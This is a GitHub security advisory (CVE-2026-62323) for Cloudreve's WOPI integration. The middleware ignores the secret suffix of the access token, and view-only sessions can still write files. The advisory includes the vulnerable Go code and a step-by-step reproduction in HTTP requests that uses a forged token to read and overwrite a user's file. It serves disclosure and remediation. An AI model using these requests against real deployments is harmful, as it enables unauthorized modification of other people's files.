# [M] Cloudreve WOPI view sessions can write files and WOPI access token secret is ignored

## Summary
Severity: Medium
Advisory: GHSA-c3jm-gv5r-9wcp
CVE: CVE-2026-62323
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-c3jm-gv5r-9wcp
Type: github-advisory

## Affected
- Go: `github.com/cloudreve/Cloudreve/v4` — affected >=0 <4.0.0-20260626022433-f3347130ac48
- Go: `github.com/cloudreve/Cloudreve/v3` — affected >=0

## Details
## Summary

Cloudreve WOPI access tokens are generated as `<session-id>.<random-secret>`, but the WOPI middleware validates only the session id prefix and never compares the supplied token to the stored token. In addition, a WOPI viewer session does not store or enforce the requested viewer action. A session created for a view or preview action can still call WOPI write routes if the underlying file is writable by the session user.

## Impact

A WOPI integration that is only expected to view a user's file can modify that file through the WOPI write endpoints. If the WOPI URL or session id leaks, the random token suffix does not protect the session because any suffix is accepted for an existing session id.

This affects deployments that configure WOPI viewers for user files. The attacker primitive is strongest when a malicious or compromised WOPI viewer receives a view-only URL and then writes content back to Cloudreve.

## Affected version

Verified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.

## Technical details

Cloudreve creates WOPI viewer sessions in `pkg/filemanager/manager/viewer.go`:

```go
sessionID := uuid.Must(uuid.NewV4()).String()
token := util.RandStringRunesCrypto(128)
sessionCache := &ViewerSessionCache{
    ID:       sessionID,
    Uri:      file.Uri(false).String(),
    UserID:   m.user.ID,
    ViewerID: viewer.ID,
    FileID:   file.ID(),
    Version:  version,
    Token:    fmt.Sprintf("%s.%s", sessionID, token),
}
```

The token includes a 128-character random suffix, but `middleware.ViewerSessionValidation()` only uses the prefix before the dot:

```go
accessToken := strings.Split(c.Query(wopi.AccessTokenQuery), ".")
if len(accessToken) != 2 {
    ...
}

sessionRaw, exist := store.Get(manager.ViewerSessionCachePrefix + accessToken[0])
```

The middleware checks that the file id matches the loaded session, but it never compares `c.Query("access_token")` with `session.Token`. As a result, `<valid-session-id>.anything` is accepted.

The WOPI routes are exposed without normal session authentication and rely on this middleware:

```go
wopi := noAuth.Group("file/wopi", middleware.HashID(hashid.FileID), middleware.ViewerSessionValidation())
wopi.GET(":id", controllers.CheckFileInfo)
wopi.GET(":id/contents", controllers.GetFile)
wopi.POST(":id/contents", controllers.PutFile)
wopi.POST(":id", controllers.ModifyFile)
```

The write routes are not protected by a session-level write check. `CreateViewerSessionService` accepts `preferred_action`, but `ViewerSessionCache` has no action or write-permission field and `CreateViewerSession` does not persist the chosen action. The requested action is only used to generate the WOPI source URL:

```go
wopiSrc, err := wopi.GenerateWopiSrc(c, s.PreferredAction, targetViewer, viewerSession)
```

`WopiService.PutContent()` checks only the underlying filesystem upload capability:

```go
file, err := m.Get(c, uri, dbfs.WithRequiredCapabilities(dbfs.NavigatorCapabilityUploadFile), dbfs.WithNotRoot())
```

It does not check whether the WOPI session was created for an edit action.

## Reproduction

The following sequence was verified against a disposable local Cloudreve instance built from the affected commit.

1. Configure a WOPI viewer in Cloudreve.
2. Create a user-owned file, for example `cloudreve://my/wopi.txt`, containing `original content`.
3. Create a viewer session with `preferred_action` set to `view`:

```http
PUT /api/v4/file/viewerSession HTTP/1.1
Authorization: Bearer <user-token>
Content-Type: application/json

{
  "uri": "cloudreve://my/wopi.txt",
  "version": "",
  "viewer_id": "poc-wopi",
  "preferred_action": "view"
}
```

Observed response:

```json
{
  "session": {
    "id": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1",
    "access_token": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.<128-char-random-secret>"
  }
}
```

4. Replace the token suffix with any value:

```http
GET /api/v4/file/wopi/4xc5?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
```

Observed response: `200 OK`. The same request with an unknown session id returned `403 Forbidden`, confirming the middleware validates the session id prefix but ignores the secret suffix.

5. Use the forged token from the view-created session to read content:

```http
GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
```

Observed response:

```http
HTTP/1.1 200 OK
Content-Length: 16
Etag: "1bIo"

original content
```

6. Use the same forged token from the view-created session to write content:

```http
POST /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
X-WOPI-Lock: cloudreve-poc
Content-Type: application/octet-stream

runtime modified via view session forged suffix
```

Observed response:

```http
HTTP/1.1 200 OK
X-Wopi-Itemversion: nBc0
```

7. Read back the modified file with the forged token:

```http
GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
```

Observed response:

```http
HTTP/1.1 200 OK
Content-Length: 47
Etag: "nBc0"

runtime modified via view session forged suffix
```

This proves both authorization failures: the random token suffix is ignored, and a view-created WOPI session can reach the content write sink.

## Root cause

Two authorization values are generated or accepted but not enforced:

1. The random WOPI token suffix is generated and stored but never compared during WOPI request validation.
2. The requested WOPI action is accepted during session creation but not persisted or enforced on WOPI write routes.

## Remediation

- Compare the full supplied `access_token` to the stored `ViewerSessionCache.Token` using constant-time comparison.
- Reject malformed tokens and tokens with extra separators.
- Store a `CanWrite` flag or selected WOPI action in `ViewerSessionCache`.
- Enforce that flag on `POST /contents`, `PUT_RELATIVE`, `LOCK`, and other write operations.
- Include session-level write permission when returning WOPI `FileInfo` fields such as `ReadOnly` and `UserCanWrite`.

## References
- https://github.com/cloudreve/cloudreve/security/advisories/GHSA-c3jm-gv5r-9wcp
- https://github.com/cloudreve/cloudreve/commit/f3347130ac48f2ff996af9ef66c97be2dda9cba9
- https://github.com/cloudreve/cloudreve
